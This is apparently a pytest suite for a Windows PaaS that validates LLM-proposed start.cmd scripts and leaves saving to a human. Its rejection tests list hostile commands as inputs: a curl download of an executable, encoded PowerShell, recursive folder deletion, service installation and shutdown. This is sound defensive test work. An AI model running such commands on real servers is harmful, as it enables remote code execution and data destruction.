"""기동 스크립트(start.cmd)를 LLM이 쓴다 — 제안까지만, 저장은 사람이.

이 스크립트는 서버에서 **서비스 권한으로** 실행된다. 그래서 두 가지를 테스트가 지킨다:
검증을 통과하지 못한 스크립트는 저장되지 않는다는 것, 그리고 복합 배포는 컴포넌트마다
스크립트가 따로라는 것(한 스크립트가 둘을 띄우면 서비스 감시자가 자식 하나만 본다).
"""
import subprocess
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from app.config import get_settings
from app.db import SessionLocal
from app.main import create_app
from app.models import BuildProfile, LlmProvider, Project, ProjectType
from app.services import build as build_module
from app.services import deployer, startscript
from app.services.runtime.base import Endpoint

ADMIN = {"x-api-key": "test-admin-key"}
API = "/paas/api/v1"

# 주석은 판정에서 빠진다(REM에 curl이 적혀 있어도 거부하지 않는다). ASCII만 쓴다 —
# cmd가 콘솔 코드페이지로 읽어 한글이 섞이면 줄 경계가 밀린다.
GOOD = """@echo off
REM The platform installs dependencies; this used to run curl (comments are ignored).
python -m streamlit run app.py --server.port %PORT% --server.address %HOST%
"""


def _write(root: Path, rel: str, body: str = "x") -> None:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(body, encoding="utf-8")


def _git_repo(root: Path) -> None:
    """file_tree는 `git ls-files`다 — 커밋되지 않은 파일은 사실로 치지 않는다."""
    quiet = {"cwd": root, "capture_output": True}
    subprocess.run(["git", "init", "-q"], **quiet, check=True)
    subprocess.run(["git", "add", "-A", "-f"], **quiet, check=True)
    subprocess.run(
        # 빈 리포도 쓴다 — "파일이 하나도 없는 리포"도 사실 중 하나다(그때 제안이 실패하는지
        # 보는 테스트가 있다). --allow-empty 없이는 커밋 자체가 실패한다.
        ["git", "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "init",
         "--allow-empty"],
        **quiet, check=True,
    )


# --- 검증 ---

def test_accepts_a_plain_start_script():
    assert startscript.validate(GOOD) == []


def test_rejects_the_script_without_the_injected_port():
    """포트를 박아 넣으면 프록시가 보는 포트에서 뜨지 않는다 — 조용히 502가 된다."""
    problems = startscript.validate("@echo off\npython -m uvicorn app:app --port 8000\n")
    assert any("%PORT%" in p for p in problems)


@pytest.mark.parametrize("line,expected", [
    ("rd /s /q node_modules", "폴더 일괄 삭제"),
    ("curl -o x.exe http://example.com/x.exe", "내려받는"),
    ("powershell -enc SQBFAFgA", "인코딩된"),
    ("nssm install paas-x cmd", "서비스 등록"),
    ("cd /d C:\\Windows", "절대 경로"),
])
def test_rejects_commands_a_start_script_has_no_business_running(line, expected):
    problems = startscript.validate(f"@echo off\n{line}\napp --port %PORT%\n")
    assert any(expected in p for p in problems), problems


def test_rejects_non_ascii_even_in_comments():
    """실측: UTF-8 한글이 든 start.cmd는 기동 전에 rc=255로 죽었다(codepage 949).

    cmd는 이 파일을 콘솔 코드페이지로 읽는다. 한글이 섞이면 2바이트 판독이 어긋나 줄
    경계가 밀리고, 다음 줄의 REM이 먹히면서 주석이 명령으로 실행된다 — 화면에는 nssm의
    "SERVICE_PAUSED"만 남아 원인이 보이지 않았다. 주석까지 영어여야 한다.
    """
    problems = startscript.validate(
        "@echo off\nREM 한글 주석\napp --port %PORT%\n")
    assert any("ASCII" in p for p in problems), problems


def test_rejects_an_empty_script():
    assert startscript.validate("   \n") == ["스크립트가 비어 있습니다."]


# --- 사실(프롬프트 입력) ---

def test_facts_scope_to_the_component_folder(tmp_path):
    """컴포넌트 스크립트는 그 폴더의 사실로 쓰인다 — 리포 루트의 package.json이 아니다."""
    _write(tmp_path, "api/requirements.txt", "fastapi\nuvicorn\n")
    _write(tmp_path, "web/package.json", '{"scripts": {"dev": "vite"}}')
    _git_repo(tmp_path)
    project = Project(name="shop-f", type=ProjectType.composite,
                      git_url="https://git.example.com/x",
                      structure={"components": [
                          {"name": "api", "path": "api", "type": "fastapi"},
                          {"name": "web", "path": "web", "type": "react"},
                      ]})

    web = startscript._facts(tmp_path, project, "web")
    assert "dev: vite" in web
    assert "fastapi" not in web
    # 실행 폴더를 명시한다 — 복합은 컴포넌트 폴더에서 돌고, 단일은 리포 루트에서 돈다.
    assert "working directory: web" in web

    api = startscript._facts(tmp_path, project, "api")
    assert "fastapi" in api and "dev: vite" not in api


def test_facts_reject_a_component_that_is_not_in_the_detected_structure(tmp_path):
    _git_repo(tmp_path)
    project = Project(name="shop-g", type=ProjectType.composite,
                      git_url="https://git.example.com/x", structure={"components": []})
    with pytest.raises(ValueError):
        startscript._facts(tmp_path, project, "nope")


# --- 저장된 스크립트가 배포에 쓰이는가 ---

def test_start_script_for_falls_back_to_the_template():
    project = Project(name="shop-h", type=ProjectType.python,
                      git_url="https://git.example.com/x")
    assert build_module.start_script_for(project) == build_module._START_SCRIPT
    assert build_module.start_script_for(None) == build_module._START_SCRIPT


def test_start_script_for_picks_the_profile_and_component_entry():
    """프로필·컴포넌트마다 따로 저장된다 — 개발 배포와 운영 배포는 기동 방법이 아예 다르다."""
    project = Project(name="shop-i", type=ProjectType.composite,
                      git_url="https://git.example.com/x",
                      start_scripts={
                          "release:": "root-release",
                          "release:web": "web-release",
                          "development:web": "web-dev",
                      })
    assert build_module.start_script_for(project, "web") == "web-release"
    assert build_module.start_script_for(
        project, "web", BuildProfile.development) == "web-dev"
    assert build_module.start_script_for(project) == "root-release"
    # 저장되지 않은 조합은 템플릿이다 — 다른 프로필·컴포넌트의 것을 빌려 쓰면 안 된다.
    assert build_module.start_script_for(project, "api") == build_module._START_SCRIPT
    assert build_module.start_script_for(
        project, "", BuildProfile.development) == build_module._START_SCRIPT


# --- API ---

@pytest.fixture
def client():
    app = create_app()
    with TestClient(app) as c:
        yield c


def _project(db, name: str, **kw) -> Project:
    project = Project(name=name, git_url="https://git.example.com/x",
                      type=kw.pop("type", ProjectType.python), **kw)
    db.add(project)
    db.commit()
    db.refresh(project)
    return project


def test_saving_requires_passing_validation(client):
    db = SessionLocal()
    try:
        project = _project(db, "script-api-1")
    finally:
        db.close()

    bad = client.put(f"{API}/projects/{project.id}/start-script",
                     json={"script": "@echo off\nshutdown /r\n"}, headers=ADMIN)
    assert bad.status_code == 422
    assert "시스템 종료" in bad.json()["detail"]
    # 거부된 스크립트는 저장되지 않는다 — 경고만 하고 통과시키면 아무도 읽지 않는다.
    current = client.get(f"{API}/projects/{project.id}/start-script", headers=ADMIN)
    assert current.json()["source"] == "template"

    ok = client.put(f"{API}/projects/{project.id}/start-script",
                    json={"script": GOOD}, headers=ADMIN)
    assert ok.status_code == 200
    again = client.get(f"{API}/projects/{project.id}/start-script", headers=ADMIN).json()
    assert again["source"] == "project"
    assert again["script"] == GOOD
    assert again["components"] == []  # 단일 배포에는 고를 유닛이 없다


def test_component_scripts_are_stored_separately(client):
    db = SessionLocal()
    try:
        project = _project(db, "script-api-2", type=ProjectType.composite,
                           structure={"components": [
                               {"name": "api", "path": "api", "type": "fastapi"},
                               {"name": "web", "path": "web", "type": "react"},
                           ]})
    finally:
        db.close()

    url = f"{API}/projects/{project.id}/start-script"
    assert client.put(url, json={"script": GOOD}, headers=ADMIN,
                      params={"component": "api"}).status_code == 200
    assert client.put(url, json={"script": GOOD.replace("app.py", "web.py")},
                      headers=ADMIN, params={"component": "web"}).status_code == 200

    api_out = client.get(url, headers=ADMIN, params={"component": "api"}).json()
    web_out = client.get(url, headers=ADMIN, params={"component": "web"}).json()
    assert "app.py" in api_out["script"] and "web.py" in web_out["script"]
    assert api_out["components"] == ["api", "web"]

    # 되돌리기는 그 유닛만 되돌린다 — 다른 컴포넌트의 스크립트가 함께 사라지면 안 된다.
    assert client.delete(url, headers=ADMIN, params={"component": "api"}).status_code == 200
    assert client.get(url, headers=ADMIN,
                      params={"component": "api"}).json()["source"] == "template"
    assert client.get(url, headers=ADMIN,
                      params={"component": "web"}).json()["source"] == "project"


def test_profiles_keep_separate_scripts(client):
    """개요 화면의 프로필 행마다 버튼이 따로인 이유 — 저장도 따로여야 한다.

    한 스크립트로 두 프로필을 덮으면 사람이나 LLM이 %PAAS_PROFILE% 분기를 다시 써야 하고,
    한쪽을 고치면 다른 쪽이 조용히 같이 바뀐다.
    """
    db = SessionLocal()
    try:
        project = _project(db, "script-api-6")
    finally:
        db.close()

    url = f"{API}/projects/{project.id}/start-script"
    dev = GOOD.replace("app.py", "dev.py")
    assert client.put(url, json={"script": GOOD}, headers=ADMIN,
                      params={"profile": "release"}).status_code == 200
    assert client.put(url, json={"script": dev}, headers=ADMIN,
                      params={"profile": "development"}).status_code == 200

    assert "app.py" in client.get(url, headers=ADMIN,
                                  params={"profile": "release"}).json()["script"]
    assert "dev.py" in client.get(url, headers=ADMIN,
                                  params={"profile": "development"}).json()["script"]
    # 한쪽을 되돌려도 다른 쪽은 남는다.
    assert client.delete(url, headers=ADMIN, params={"profile": "development"}).status_code == 200
    assert client.get(url, headers=ADMIN,
                      params={"profile": "development"}).json()["source"] == "template"
    assert client.get(url, headers=ADMIN,
                      params={"profile": "release"}).json()["source"] == "project"


def test_unknown_component_is_rejected_instead_of_falling_back(client):
    """없는 컴포넌트가 조용히 ""로 떨어지면, 컴포넌트 스크립트를 저장한 줄 알고
    단일 스크립트를 덮어쓴다."""
    db = SessionLocal()
    try:
        project = _project(db, "script-api-3", type=ProjectType.composite,
                           structure={"components": [{"name": "api", "path": "api"}]})
    finally:
        db.close()
    res = client.put(f"{API}/projects/{project.id}/start-script",
                     json={"script": GOOD}, headers=ADMIN, params={"component": "nope"})
    assert res.status_code == 404


def test_propose_does_not_save(client, monkeypatch, tmp_path):
    """LLM이 쓴 것을 그대로 저장하면 그것은 원격 코드 실행이다 — 제안은 저장하지 않는다."""
    _write(tmp_path, "app.py", "print(1)")
    _git_repo(tmp_path)
    db = SessionLocal()
    try:
        project = _project(db, "script-api-4")
        provider = LlmProvider(name="p", kind="openai", base_url="http://x",
                               model="m", api_key_encrypted=None)
        db.add(provider)
        db.commit()
        db.refresh(provider)
    finally:
        db.close()

    monkeypatch.setattr(startscript.workspace, "code_workdir", lambda p: tmp_path)
    monkeypatch.setattr("app.services.workspace.code_workdir", lambda p: tmp_path)
    monkeypatch.setattr(
        startscript.llm_service, "chat_completion",
        lambda *a, **kw: f"설명입니다.\n```bat\n{GOOD}```\n",
    )

    res = client.post(f"{API}/projects/{project.id}/start-script/propose",
                      json={"provider_id": provider.id}, headers=ADMIN)
    assert res.status_code == 200, res.text
    assert res.json()["script"].strip() == GOOD.strip()
    assert res.json()["problems"] == []
    assert res.json()["facts"]  # 무엇을 보고 썼는지 사람이 확인할 수 있어야 한다
    # 저장은 별도 요청으로만 — 제안 직후의 현재 스크립트는 아직 템플릿이다.
    assert client.get(f"{API}/projects/{project.id}/start-script",
                      headers=ADMIN).json()["source"] == "template"


def test_propose_reports_problems_instead_of_hiding_them(client, monkeypatch, tmp_path):
    _git_repo(tmp_path)
    db = SessionLocal()
    try:
        project = _project(db, "script-api-5")
        provider = LlmProvider(name="p2", kind="openai", base_url="http://x", model="m")
        db.add(provider)
        db.commit()
        db.refresh(provider)
    finally:
        db.close()
    monkeypatch.setattr("app.services.workspace.code_workdir", lambda p: tmp_path)
    monkeypatch.setattr(startscript.llm_service, "chat_completion",
                        lambda *a, **kw: "```bat\n@echo off\nrd /s /q C:\\x\n```")
    res = client.post(f"{API}/projects/{project.id}/start-script/propose",
                      json={"provider_id": provider.id}, headers=ADMIN).json()
    assert res["problems"]


# --- 복합 네이티브 배포 ---

class _FakeRuntime:
    def __init__(self):
        self.specs = []

    def start(self, spec):
        self.specs.append(spec)
        return Endpoint(host="127.0.0.1", port=9000 + len(self.specs))

    def stop(self, *a): ...
    def status(self, project_name, profile): return "stopped"
    def logs(self, *a, **kw): return ""


def test_native_composite_deploy_writes_a_script_per_component(
    monkeypatch, tmp_path, fresh_settings,
):
    """회귀: windows_service는 "리포 루트의 단일 start.cmd만 실행한다"며 복합을 거부했다.

    컴포넌트마다 그 폴더에 스크립트를 쓰면 유닛·포트·공개 경로가 이미 컴포넌트별인
    구조와 아귀가 맞는다 — 이미지는 만들지 않는다(docker를 찾다 실패하면 안 된다).
    """
    create_app()
    monkeypatch.setenv("PAAS_RUNTIME_BACKEND", "windows_service")
    monkeypatch.setenv("PAAS_TIER", "small")
    get_settings.cache_clear()

    _write(tmp_path, "api/requirements.txt", "fastapi\n")
    _write(tmp_path, "web/package.json", '{"dependencies": {"react": "18"}}')

    db = SessionLocal()
    try:
        project = _project(db, "native-composite", type=ProjectType.composite)
        project.start_scripts = {"release:web": GOOD.replace("app.py", "web.py")}
        db.commit()

        monkeypatch.setattr(deployer, "checkout", lambda p, git_sha=None: (tmp_path, "b" * 40))
        monkeypatch.setattr(deployer, "build_image", _must_not_build)
        installed: list[Path] = []
        monkeypatch.setattr(deployer, "install_dependencies",
                            lambda workdir, log, **kw: installed.append(workdir))
        runtime = _FakeRuntime()
        monkeypatch.setattr(deployer, "get_runtime", lambda: runtime)
        monkeypatch.setattr(deployer.proxy, "configure_paths", lambda *a, **kw: None)

        records = deployer.deploy_composite_sync(db, project, BuildProfile.release)

        assert set(records) == {"api", "web"}
        # 설치·기동은 컴포넌트 폴더에서 — 리포 루트에서 npm ci를 돌리면 아무것도 못 찾는다.
        assert sorted(installed) == sorted([tmp_path / "api", tmp_path / "web"])
        assert sorted(s.work_subdir for s in runtime.specs) == ["api", "web"]
        # 저장된 스크립트는 그 컴포넌트에, 없는 컴포넌트는 템플릿이 쓰인다.
        assert "web.py" in (tmp_path / "web" / "start.cmd").read_text(encoding="utf-8")
        assert (tmp_path / "api" / "start.cmd").read_text(encoding="utf-8") \
            == build_module._START_SCRIPT
    finally:
        db.close()
        get_settings.cache_clear()


def _must_not_build(*a, **kw):
    raise AssertionError("네이티브 런타임은 이미지를 만들지 않는다")


def test_api_saved_script_is_the_file_the_deploy_runs(client, monkeypatch, tmp_path,
                                                      fresh_settings):
    """화면에서 저장한 그 본문이, 배포가 실행하는 start.cmd 파일이 된다(개발 프로필).

    저장(API) → 배포(write_start_script) → 런타임(그 폴더의 start.cmd 실행)까지를 한 번에
    본다. 중간에 파일을 덮어쓰는 다른 경로가 생기면 이 테스트가 먼저 깨진다.
    """
    _write(tmp_path, "package.json", '{"scripts": {"dev": "vite"}}')
    db = SessionLocal()
    try:
        project = _project(db, "runs-what-i-saved", type=ProjectType.react)
        pid = project.id
    finally:
        db.close()

    dev_script = GOOD.replace("app.py", "dev_entry.py")
    saved = client.put(f"{API}/projects/{pid}/start-script", json={"script": dev_script},
                       headers=ADMIN, params={"profile": "development"})
    assert saved.status_code == 200, saved.text

    monkeypatch.setenv("PAAS_RUNTIME_BACKEND", "windows_service")
    monkeypatch.setenv("PAAS_TIER", "small")
    get_settings.cache_clear()
    monkeypatch.setattr(deployer, "checkout", lambda p, git_sha=None: (tmp_path, "d" * 40))
    monkeypatch.setattr(deployer, "build_image", _must_not_build)
    monkeypatch.setattr(deployer, "install_dependencies", lambda *a, **kw: None)
    runtime = _FakeRuntime()
    monkeypatch.setattr(deployer, "get_runtime", lambda: runtime)
    monkeypatch.setattr(deployer.proxy, "configure", lambda *a, **kw: None)

    db = SessionLocal()
    try:
        deployer.deploy_sync(db, db.get(Project, pid), BuildProfile.development)
    finally:
        db.close()
        get_settings.cache_clear()

    assert (tmp_path / "start.cmd").read_text(encoding="utf-8") == dev_script
    # 런타임은 그 파일이 있는 폴더를 실행 폴더로 받는다(work_subdir "" = 리포 루트).
    assert runtime.specs and runtime.specs[0].work_subdir == ""


def test_saved_script_is_applied_on_the_very_next_deploy(monkeypatch, tmp_path, fresh_settings):
    """저장한 스크립트는 **다음 배포에 바로** start.cmd가 된다 — 다른 조작이 필요 없다.

    진단 팝업이 "기동 스크립트 작성"으로 보내는 근거다: 실행 방법을 못 찾아 실패했을 때,
    스크립트를 저장하고 다시 배포하면 그 스크립트로 뜬다. 그 프로필의 것만 쓰인다 —
    개발 배포용으로 저장한 것이 운영 배포에 새어 들어가면 안 된다.
    """
    create_app()
    monkeypatch.setenv("PAAS_RUNTIME_BACKEND", "windows_service")
    monkeypatch.setenv("PAAS_TIER", "small")
    get_settings.cache_clear()

    _write(tmp_path, "requirements.txt", "fastapi\n")
    db = SessionLocal()
    try:
        project = _project(db, "applies-now", type=ProjectType.python)
        release_script = GOOD.replace("app.py", "release_entry.py")
        project.start_scripts = {
            build_module.script_key(BuildProfile.release): release_script,
            build_module.script_key(BuildProfile.development): GOOD.replace("app.py", "dev.py"),
        }
        db.commit()

        monkeypatch.setattr(deployer, "checkout", lambda p, git_sha=None: (tmp_path, "c" * 40))
        monkeypatch.setattr(deployer, "build_image", _must_not_build)
        monkeypatch.setattr(deployer, "install_dependencies", lambda *a, **kw: None)
        monkeypatch.setattr(deployer, "get_runtime", lambda: _FakeRuntime())
        monkeypatch.setattr(deployer.proxy, "configure", lambda *a, **kw: None)

        deployer.deploy_sync(db, project, BuildProfile.release)

        written = (tmp_path / "start.cmd").read_text(encoding="utf-8")
        assert written == release_script
        assert "dev.py" not in written
    finally:
        db.close()
        get_settings.cache_clear()


# --- 포트 판정과 자동 교정 ---

@pytest.mark.parametrize("line,expect", [
    # cmd가 아닌 셸 문법 — 값이 아니라 글자로 남아 앱이 기본 포트로 뜬다(실측 사례).
    ("python -m uvicorn app:app --port $PORT", "cmd 배치"),
    ("python -m uvicorn app:app --port ${PORT}", "cmd 배치"),
    ("node server.js --port $env:PORT", "cmd 배치"),
    # 지연 확장을 켜지 않은 !PORT!는 글자 그대로다
    ("node server.js --port !PORT!", "지연 확장"),
])
def test_port_problem_says_what_to_write_instead(line, expect):
    problems = startscript.validate(f"@echo off\n{line}\n")
    assert any(expect in p for p in problems), problems
    # 어느 경우든 무엇을 쓰면 되는지 알려 준다 — 거부 사유만으로는 고칠 수 없다.
    assert any("%PORT%" in p for p in problems), problems


def test_delayed_expansion_makes_bang_port_acceptable():
    """`!PORT!`도 지연 확장을 켰다면 값이 된다 — 형태만 보고 거부하면 맞는 것도 막는다."""
    script = ("@echo off\nsetlocal enabledelayedexpansion\n"
              "node server.js --port !PORT! --host !HOST!\n")
    assert startscript.validate(script) == []


def test_propose_feeds_the_validation_back_and_retries_once(monkeypatch, tmp_path):
    """실측: %PORT%를 빠뜨린 제안이 그대로 거부되어 사람이 손으로 고쳐야 했다.

    검증은 저장을 막는 장치지 사람에게 내는 숙제가 아니다 — 지적을 그대로 모델에게 돌려주고
    한 번 고치게 한다. 두 번째도 틀리면 거기서 멈춘다(세 번째도 틀린다).
    """
    _git_repo(tmp_path)
    project = Project(name="retry-port", type=ProjectType.python,
                      git_url="https://git.example.com/x")
    replies = [
        "```bat\n@echo off\npython -m uvicorn app:app --port 8000\n```",
        f"```bat\n{GOOD}```",
    ]
    seen: list[list[dict]] = []

    def fake_chat(provider, messages, db):
        seen.append(messages)
        return replies[len(seen) - 1]

    monkeypatch.setattr(startscript.llm_service, "chat_completion", fake_chat)
    out = startscript.propose(None, project, object(), tmp_path)

    assert out["attempts"] == 2
    assert out["problems"] == []
    assert out["script"].strip() == GOOD.strip()
    # 두 번째 요청에는 첫 스크립트와 거부 사유가 함께 실린다.
    assert seen[1][-2]["role"] == "assistant"
    assert "%PORT%" in seen[1][-1]["content"]


def test_propose_keeps_the_first_script_when_the_retry_is_worse(monkeypatch, tmp_path):
    """"고쳤다"가 늘 나아짐은 아니다 — 더 나빠지면 첫 제안을 지킨다."""
    _git_repo(tmp_path)
    project = Project(name="retry-worse", type=ProjectType.python,
                      git_url="https://git.example.com/x")
    replies = [
        "```bat\n@echo off\napp.exe --port 8000\n```",              # 문제 1건
        "```bat\n@echo off\nshutdown /r\ntaskkill /f /im x.exe\n```",  # 문제 3건
    ]
    monkeypatch.setattr(startscript.llm_service, "chat_completion",
                        lambda p, m, d: replies[min(len(m) // 3, 1)])
    out = startscript.propose(None, project, object(), tmp_path)
    assert out["attempts"] == 2
    assert "app.exe" in out["script"]
    assert len(out["problems"]) == 1


def test_the_platform_template_passes_its_own_validation():
    """우리 템플릿이 우리 검증을 통과해야 한다 — 통과하지 못하면 규칙이 너무 넓다는 뜻이다
    (실제로 `set PORT=%PORT%`를 덮어쓰기로 오판한 규칙을 이 테스트가 잡았다)."""
    assert startscript.validate(build_module._START_SCRIPT) == []


def test_rejects_overwriting_the_injected_port():
    """%PORT%를 쓰더라도 그 값을 8000으로 덮어쓰면 프록시가 보는 포트가 아니다 —
    배포는 성공인데 주소는 502다. 조건 없는 `set PORT=` 대입만 막는다."""
    problems = startscript.validate(
        "@echo off\nset PORT=8000\nnode server.js --port %PORT%\n")
    assert any("덮어씁니다" in p for p in problems), problems
    # 기본값 형태와 제자리 대입은 막지 않는다(템플릿이 둘 다 쓴다).
    assert startscript.validate(
        "@echo off\nif not defined PORT set PORT=8000\n"
        "node server.js --port %PORT%\n") == []
    assert startscript.validate(
        "@echo off\nset PORT=%PORT%\nnode server.js --port %PORT%\n") == []


def test_native_single_deploy_uses_source_subdir_as_the_run_folder(monkeypatch, tmp_path,
                                                                  fresh_settings):
    """실측(supplier-pool): 소스가 `Strategy/`에 있는데 네이티브 배포는 리포 루트에서
    설치를 찾았다 — 아무것도 설치되지 않고 앱은 의존성이 없어 죽었다(nssm SERVICE_PAUSED).

    진단이 "source_subdir를 지정하세요"라고 제안하는데 그 값이 이 런타임에서 아무 효과가
    없었다는 뜻이다. 설치·스크립트·실행 폴더가 모두 그 폴더여야 한다.
    """
    create_app()
    monkeypatch.setenv("PAAS_RUNTIME_BACKEND", "windows_service")
    monkeypatch.setenv("PAAS_TIER", "small")
    get_settings.cache_clear()

    _write(tmp_path, "Strategy/requirements.txt", "streamlit\n")
    _write(tmp_path, "Strategy/app.py", "print(1)")
    db = SessionLocal()
    try:
        project = _project(db, "subdir-native", type=ProjectType.streamlit,
                           source_subdir="Strategy")
        monkeypatch.setattr(deployer, "checkout", lambda p, git_sha=None: (tmp_path, "e" * 40))
        monkeypatch.setattr(deployer, "build_image", _must_not_build)
        installed: list[Path] = []
        monkeypatch.setattr(deployer, "install_dependencies",
                            lambda workdir, log, **kw: installed.append(workdir))
        runtime = _FakeRuntime()
        monkeypatch.setattr(deployer, "get_runtime", lambda: runtime)
        monkeypatch.setattr(deployer.proxy, "configure", lambda *a, **kw: None)

        deployer.deploy_sync(db, project, BuildProfile.release)

        assert installed == [tmp_path / "Strategy"]
        assert (tmp_path / "Strategy" / "start.cmd").is_file()
        assert not (tmp_path / "start.cmd").exists()  # 루트에 쓰면 런타임이 못 찾는다
        assert runtime.specs[0].work_subdir == "Strategy"
    finally:
        db.close()
        get_settings.cache_clear()


def test_native_deploy_fails_clearly_when_source_subdir_is_not_in_the_repo(
        monkeypatch, tmp_path, fresh_settings):
    """없는 폴더를 가리키면 "설치할 것이 없다"가 아니라 그 사실을 말해야 한다."""
    create_app()
    monkeypatch.setenv("PAAS_RUNTIME_BACKEND", "windows_service")
    get_settings.cache_clear()
    db = SessionLocal()
    try:
        project = _project(db, "subdir-missing", type=ProjectType.python,
                           source_subdir="nope")
        monkeypatch.setattr(deployer, "checkout", lambda p, git_sha=None: (tmp_path, "f" * 40))
        monkeypatch.setattr(deployer, "get_runtime", lambda: _FakeRuntime())
        with pytest.raises(build_module.BuildError) as raised:
            deployer.deploy_sync(db, project, BuildProfile.release)
        assert "nope" in str(raised.value)
    finally:
        db.close()
        get_settings.cache_clear()
